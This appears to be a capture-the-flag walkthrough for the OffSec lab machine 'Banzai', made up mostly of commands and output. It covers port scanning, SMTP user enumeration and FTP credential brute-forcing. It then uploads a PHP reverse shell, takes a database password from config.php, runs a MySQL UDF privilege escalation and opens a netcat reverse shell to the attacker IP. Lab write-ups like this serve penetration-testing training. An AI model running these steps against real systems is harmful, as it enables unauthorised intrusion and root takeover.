																			                        Banzai Walkthrough
																			
Attacker's Machine: 192.168.45.5
Victim's Machine: 192.168.204.56
export IP=192.168.204.56
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

21/tcp   open   ftp
22/tcp   open   ssh
25/tcp   open   smtp
5432/tcp open   postgresql
8080/tcp open   http-proxy
8295/tcp open   unknown

nmap -Pn -n -sC -sV -p20,21,22,25,5432,8080,8295 $IP --open --stats-every=5s -oN results.txt

21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open  postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
8080/tcp open  http       Apache httpd 2.4.25
8295/tcp open  http       Apache httpd 2.4.25 ((Debian))
|_http-title: Banzai
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix


nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
 <!-- nothing -->
 
 Vulnerability Assessment

nmap -n $IP -p 8295 -sV --script vuln --stats-every=5s 
css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
/img/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
/lib/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'

nikto --url $IP



Port 25
nc -vn $IP 25
vrfy admin
252 2.0.0 admin
vrfy root
252 2.0.0 root
vrfy urs
550 5.1.1 <urs>: Recipient address rejected: User unknown in local recipient table

smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP -p 25 
banzai exists
www-data exists
admin exists
root exists


# Check for CVE-2010-4344
nmap --script smtp-vuln-cve2010-4344 -p25 $IP
The SMTP server is not Exim: NOT VULNERABLE

# Check for open relays
telnet $IP 25
Trying 192.168.238.56...
Connected to 192.168.238.56.
Escape character is '^]'.
220 banzai.offseclabs.com ESMTP Postfix (Debian/GNU)
mail from: banzai.offseclabs.com
250 2.1.0 Ok
RCPT TO: urs@offseclabs.com
454 4.7.1 <urs@offseclabs.com>: Relay access denied


Port 5432 - PostgreSQL
# Aparently we cannot connect to database since the configuration files does not allow it. Sad face
psql -h $IP -U admin -p 5432
psql: error: connection to server at "192.168.238.56", port 5432 failed: FATAL:  no pg_hba.conf entry for host "192.168.45.5", user "admin", database "admin", SSL on
connection to server at "192.168.238.56", port 5432 failed: FATAL:  no pg_hba.conf entry for host "192.168.45.5", user "admin", database "admin", SSL off

Port 8080 
# Nothing at first sight, we might have to come back later on

Port 8295
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP:8295/FUZZ"

Port 21
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
admin / admin

wget -m --no-passive ftp://admin:admin@$IP

drwxr-xr-x  2 root root  4096 Apr 11 02:58 contactform
drwxr-xr-x  2 root root  4096 Apr 11 02:58 css
drwxr-xr-x  3 root root  4096 Apr 11 02:58 img
-rw-r--r--  1 root root 23364 May 27  2020 index.php
drwxr-xr-x  2 root root  4096 Apr 11 02:58 js
drwxr-xr-x 11 root root  4096 Apr 11 02:58 lib

# It seems to be the directory listing from port 8295

# Let's try to see if we can upload files on the FTP server

ftp admin@$IP
admin
ftp> dir
229 Entering Extended Passive Mode (|||13146|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
cd js
put shell.php

# Now that we've managed to upload a reverse shell, let's try to access it through the web application

http://192.168.214.56:8295/js/shell.php                    # Got shell

cd /home/banzai
cat local.txt                                                           # Flag: 0fa14e20c73a16dd1c3c8523f54dc436           


Privilege escalation

# Let's check for some configuration files, maybe we get lucky
find / -iname *'config.php'* 2>/dev/null
cat /var/www/config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>

root / EscalateRaftHubris123

# Can't do too much with it, since this is a mysql db, let's check for some common exploits, such as UDF (User-defined Functions). We need versions between 4.X and 5.7.3

mysql -uroot -p
EscalateRaftHubris123

# Let's check is our version is vulnerable. Version 5.7.3, we're good so far.

SELECT VERSION();
5.7.30   

SHOW VARIABLES LIKE "%version%"; 
innodb_version          | 5.7.30

# Ok, the next thing we need to check is if the db is running as root, if yes, we can continue. It is, let's continue.

ps -ef | grep mysql
root       799     1  0 09:08 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid

# Check system's architecture, good to go!

show variables like '%compile%';
version_compile_machine | x86_64
version_compile_os           | Linux 

# Since we are not sure if the plugin directory used in the MySQL instance is not the default one, the following command can be used to display the current plugin directory, from within MySQL

show variables like '%plugin%';
plugin_dir                     /usr/lib/mysql/plugin

# Also, we need to check if the variable secure_file_priv is enabled to allow data import and export operations like load_file and load_data functions.
   If the returned value is null/empty, as in the below screenshot, it means the variable is disabled, and we can load data into the database.
   
show variables like '%secure_file_priv%';


# Ok, now that we've ensure that all requirements are met, let's get ready our exploit.     https://www.exploit-db.com/exploits/1518

searchsploit mysql udf 
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                                                        | linux/local/1518.c

searchsploit -m linux/local/1518.c

# Transfer the exploit using wget or create the file directly and paste the contents of the exploit. Use a world writable directory so we can provide full rights to it.

cd /tmp
nano raptor_udf2.c

# Compile the exploit

gcc -g -c raptor_udf2.c -fPIC

# Create the shared library (so) called raptor_udf2.so

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Switch the to database in use

use mysql;

# Create a table to hold the exploit code

create table foo(line blob);   

# Import the exploit by inserting its contents into the table. Provide the directory path of where the exploit was compiled. In our case, it was compiled in the /tmp directory, where the current user “www-data” has writing permissions.    
         
insert into foo values(load_file('/tmp/raptor_udf2.so'));                

# Select the binary contents in the shared library and dump them onto the plugins directory, where UDF can be stored.

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

# Call the exploit by creating a function that invokes it.

create function do_system returns integer soname 'raptor_udf2.so';
ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 11 /usr/lib/mysql/plugin/raptor_udf2.so: file too short)

# If you encounter this error, you have two choises, either you will have to put the exploit in a directory where both root and www-data have full rights. (/var/www or even a ftp server might be good)
# Root and other users like www-data have different /tmp folders. If we transfer raptor_udf2.so to /tmp, MySQL running as root cannot find it. 
  So, you should either host the file raptor_udf2.so to /var/www or somethere where both root and www-data have full permissions. 
  Since MySQL is running as root, we can try to copy the file manually by breaking in into a shell

mysql>\! cp raptor_udf2.so /usr/lib/mysql/plugin/

# Call the exploit by creating a function that invokes it.
create function do_system returns integer soname 'raptor_udf2.so';

# Confirm the function is present in mysql.

select * from mysql.func;
+---------------+-----+--------------------+----------+
| name           | ret | dl                     | type       |
+---------------+-----+--------------------+----------+
| do_system  |   2   | raptor_udf2.so | function |
+---------------+-----+--------------------+----------+

# After creating the UDF function, let’s test it by running an OS command like "id" and redirect its output to a file we can read. 
select do_system('id > /var/www/output; chown www-data www-data  /var/www/output');

cat /var/www/output
uid=0(root) gid=114(mysql) groups=114(mysql)

# We see that our id id root. Now, we can pass the function a netcat command to get a shell back to our machine.

select do_system('nc 192.168.45.5 8080 -e /bin/bash');
nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.204.56] 40824
id
uid=0(root) gid=114(mysql) groups=114(mysql)

cat /root/proof.txt                                                       # Flag: b9b883832111414d814e5fa8a5cf74c4
